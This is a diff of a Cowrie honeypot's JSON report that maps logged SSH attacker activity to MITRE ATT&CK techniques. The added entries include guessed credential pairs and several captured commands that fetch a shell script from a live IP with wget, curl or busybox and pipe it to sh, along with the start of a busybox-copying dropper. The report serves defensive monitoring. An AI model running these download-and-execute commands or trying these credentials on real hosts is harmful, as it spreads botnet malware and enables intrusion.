@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-19 01:03:21",
+  "generated": "2026-09-19 02:03:45",
   "totals": {
-    "commands": 2744,
-    "login_failed": 984,
-    "login_success": 917,
-    "sessions": 983
+    "commands": 2760,
+    "login_failed": 1005,
+    "login_success": 921,
+    "sessions": 1016
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 984,
+      "count": 1005,
       "examples": [
         "praktikant / praktikant",
         "tom / 1234567",
@@ -21,22 +21,24 @@
         "cugweb / cugweb"
       ],
       "first": "2026-09-19T00:00:21.957099Z",
-      "last": "2026-09-19T01:00:41.397218Z",
-      "unique_ips": 11
+      "last": "2026-09-19T02:03:24.359620Z",
+      "unique_ips": 17
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 917,
+      "count": 921,
       "examples": [
         "ubuntu / ubuntu",
         "root / 111111",
-        "enable / linuxshell"
+        "enable / linuxshell",
+        "root / Test@2022",
+        "enable\\x00 / system\\x00"
       ],
       "first": "2026-09-19T00:14:11.463012Z",
-      "last": "2026-09-19T00:50:00.756795Z",
-      "unique_ips": 3
+      "last": "2026-09-19T01:53:47.059412Z",
+      "unique_ips": 7
     },
     {
       "id": "T1083",
@@ -51,16 +53,46 @@
       "unique_ips": 1
     },
     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 7,
+      "examples": [
+        "cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh",
+        "http://176.65.139.196/bins/kla.sh",
+        "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va",
+        "cd /tmp || cd /var/tmp || cd /; curl -s http://176.65.139.196/bins/kla.sh | sh",
+        "cd /tmp || cd /var/tmp || cd /; busybox wget -q -O- http://176.65.139.196/bins/kla.sh | sh"
+      ],
+      "first": "2026-09-19T01:53:50.389299Z",
+      "last": "2026-09-19T01:54:01.139910Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "uname -a",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "uname -s -m"
       ],
       "first": "2026-09-19T00:14:23.179042Z",
-      "last": "2026-09-19T00:16:07.027079Z",
+      "last": "2026-09-19T01:13:42.784224Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 2,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va"
+      ],
+      "first": "2026-09-19T00:16:07.027079Z",
+      "last": "2026-09-19T01:53:50.617827Z",
       "unique_ips": 2
     },
     {
@@ -98,28 +130,44 @@
       "first": "2026-09-19T00:16:07.027079Z",
       "last": "2026-09-19T00:16:07.027079Z",
       "unique_ips": 1
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 1,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-09-19T00:16:07.027079Z",
-      "last": "2026-09-19T00:16:07.027079Z",
-      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
-      "system",
-      914
+      "sh",
+      916
     ],
     [
-      "sh",
-      914
+      "system",
+      915
+    ],
+    [
+      "shell",
+      2
+    ],
+    [
+      "/bin/busybox IZ1H9",
+      1
+    ],
+    [
+      "/bin/busybox UNSTABLE",
+      1
+    ],
+    [
+      "echo SHELL_TEST",
+      1
+    ],
+    [
+      "/bin/busybox TEST",
+      1
+    ],
+    [
+      "cat /proc",
+      1
+    ],
+    [
+      "./",
+      1
     ]
   ]
 }
